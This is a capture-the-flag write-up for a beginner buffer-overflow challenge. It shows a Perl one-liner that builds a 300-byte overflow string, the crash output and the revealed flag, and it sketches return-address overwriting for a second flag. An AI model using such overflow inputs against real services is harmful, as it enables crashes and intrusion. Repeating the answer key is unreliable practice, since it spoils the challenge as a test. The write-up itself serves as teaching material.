# STOP GAN (pwn)

## Prompt

Success, you've gotten the picture of your lost love, not knowing that pictures and the things you take pictures of are generally two seperate things, you think you've rescue them and their brethren by downloading them all to your ships hard drive. They're still being eaten, but this is a fact that has escaped you entirely. Your thoughts swiftly shift to revenge. It's important now to stop this program from destroying these "Cauliflowers" as they're referred to, ever again.

## Files

* `files.zip`: Provided zip file that contains `console.c` and `bof`.
* `console.c`: Source code for remote console.
* `bof`: Binary file that is presumably run from `console.c`.
* `exploit.txt`: Exploit string to cause buffer overflow.
* `flag.txt`: Solution to this challenge.

## Solution

`console.c` seems to be pretty simple. It stores user input in a 256 byte buffer, and if the beginning of the buffer is `run\n\0`, the buffer overflow binary will run. Let's see if this is how the remote console actually works:

```
$ nc buffer-overflow.ctfcompetition.com 1337
Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
 Bonus flag for controlling the crash.

Console commands:
run
quit
>>run
Inputs: run
test
Cauliflower systems never crash >>

Console commands:
run
quit
>>
```

Great, this matches the provided source code and we can start trying to get the buffer to overflow. What's really interesting is that `bof` takes input before it will print the taunt `Cauliflower systems never craash >>`. If we print enough characters after the `run` command perhaps this buffer will overflow. 

Perl can be used to generate an exploit string without having to type a large number of character. The string will be constructed to start with the `run` command, newline to imitate an Enter key being pressed, and then a number of garbage bytes. 

```
perl -e 'print "run"."\x0a\x00"."A"x300' > exploit.txt
```

I chose 300 bytes because the buffer used in the console is 256 bytes, so 300 seemed safe. Now the exploit string can be copied into the console and run, then press enter to get the flag!

```
$ nc buffer-overflow.ctfcompetition.com 1337
Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
 Bonus flag for controlling the crash.

Console commands:
run
quit
>>run
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAInputs: run

CTF{Why_does_cauliflower_threaten_us}
Cauliflower systems never crash >>
segfault detected! ***CRASH***
Console commands:
run
quit
>>
``` 

Yay! But if you read the `console.c` file you will know that there is another flag hidden within this challenge. 

```
/**
 * 6e: bufferflow triggering segfault  - binary, compile with:
 * gcc /tmp/console.c -o /tmp/console -static -s
 *
 * Console allows the player to get info on the binary.
 * Crashing bof will trigger the 1st flag.
 * Controlling the buffer overflow in bof will trigger the 2nd flag.
 */
```

Controlling the buffer overflow will lead you to a second flag. This is probably why the `bof` binary was included.That part is left as an exercise to the reader, but I think a good starting place would be to try to look for interesting functions in `bof` and then use the buffer overflow to overwrite the return address, tricking the program into running those functions. 
